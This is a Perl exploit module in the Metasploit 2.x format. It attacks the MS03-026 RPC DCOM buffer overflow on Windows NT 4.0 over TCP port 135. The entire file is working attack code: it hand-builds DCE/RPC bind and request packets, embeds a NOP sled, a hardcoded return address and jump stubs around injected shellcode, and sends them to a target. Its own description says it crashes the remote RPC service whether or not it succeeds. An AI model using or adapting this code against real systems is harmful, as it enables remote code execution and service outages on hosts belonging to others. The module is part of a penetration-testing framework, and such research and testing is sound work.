package Msf::Exploit::msrpc_dcom_ms03_026_winnt;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'Microsoft RPC DCOM MSO3-026 NT 4.0',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'thread' },
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 135],
                },

    'Payload' => {
                 'Size'  => 998,  # size % 12 == 0
                 'BadChars'  => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
               },
    
    'Description'  => "This exploits the overflow found by LSD in the DCOM service available over ".
                      "RPC. This module has been tested against all english versions of Windows NT 4.0. ".
                      " The target must have DCOM enabled and TCP port 135 open. This ".
                      "exploit will crash the RPC service on the remote system regardless of whether ".
                      "it is succesful or not.",
                
    'Refs'  =>  [  
                    'http://www.microsoft.com/technet/security/bulletin/MS03-026.asp'
                ],
    'Targets' => [
                   ['Windows NT 4.0', 0x75c48ac4],
                 ],
);

sub new {
    my $class = shift;
    my $obj = $class->SUPER::new({'Info' => \%info}, @_);
    return $obj;
}

sub Exploit {
    my ($obj, $opt) = @_;

    select(STDOUT);$|++;

    my $target_host = $opt->{'RHOST'};
    my $target_port = $opt->{'RPORT'};
    my $shellcode = $opt->{'SHELLCODE'};
    
    my @targets = @{$obj->{'Info'}->{'Targets'}};
    my $target = defined($opt->{'TARGET'}) ? $targets[$opt->{'TARGET'}] : $targets[0];

    my ($os, $l_ret) = @{$target};
    my $res;

    my $Ret = pack("L", $l_ret);

    
    my $s = Pex::Socket->new();
    
    if (! $s->tcp($target_host, $target_port))
    {
        print "\n[*] Could not connect to target:" . $s->Error() . "\n";
        exit(0);
    }

    my $r_bind = 

        "\x05\x00\x0B\x03\x10\x00\x00\x00\x48\x00\x00\x00\x7F\x00\x00\x00".
        "\xD0\x16\xD0\x16\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x01\x00".
        "\xb8\x4a\x9f\x4d\x1c\x7d\xcf\x11\x86\x1e\x00\x20\xaf\x6e\x7c\x57".
        "\x00\x00\x00\x00".
        "\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60".
        "\x02\x00\x00\x00";


    my $r_path =
    
        "\x90" x 40 . 
        pack("L", $target->[1]).
        "\x90" x 84 . 
        "\xeb\x04\xff\xff\xff\xff". 
        "\x90" x 16 . 
        "\xeb\x04\xff\xff\xff\xff". 
        $shellcode . 
        "\x5c\x00\x41\x00\x00\x00\x00\x00\x00\x00";
    

    my $r_dcex =
    
        "\x05\x00\x00\x03\x10\x00\x00\x00\xff\xff\x00\x00\x03\x00\x00\x00".
        "\x8a\x04\x00\x00\x01\x00\x00\x00" .
        
        "\x05\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x58\x7d\x75\x75".
        "\x40\xeb\xc6\x47\xbc\x71\x4e\xa7\x1c\xd0\xb5\x97\x00\x00\x00\x00".
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        
        "\x00\x00\x09\x00\x20\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00".
        "\x5c\x00\x5c\x00".
        
        $r_path .
        
        "\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
        "\x68\x1c\x09\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
        "\xc0\x00\x00\x00\x00\x00\x00\x46\x01\x00\x00\x00\x01\x00\x00\x00".
        "\x07\x00";
    
    my $pathsz = ((length($r_path) + 11) & ~7) / 2;
    
    substr($r_dcex,  8, 4, pack("L", length($r_dcex)));
    substr($r_dcex, 16, 4, pack("L", length($r_dcex)));
    substr($r_dcex, 76, 4, pack("L", $pathsz));
    substr($r_dcex, 84, 4, pack("L", $pathsz));

    $s->send($r_bind);
    $res = $s->recv(5);
    if (! $res)
    {
        print "[*] Target did not accept the bind request.\n";
        exit(0);
    }
    
    printf("[*] Using return address 0x%.8x for Windows NT...\n", $l_ret);
    $s->send($r_dcex);
    $res = $s->recv(5);
    $s->close();
    
    if ($res)
    {
        print "[*] Target may be patched\n";
        return;
    }
    exit(0);
}


1;
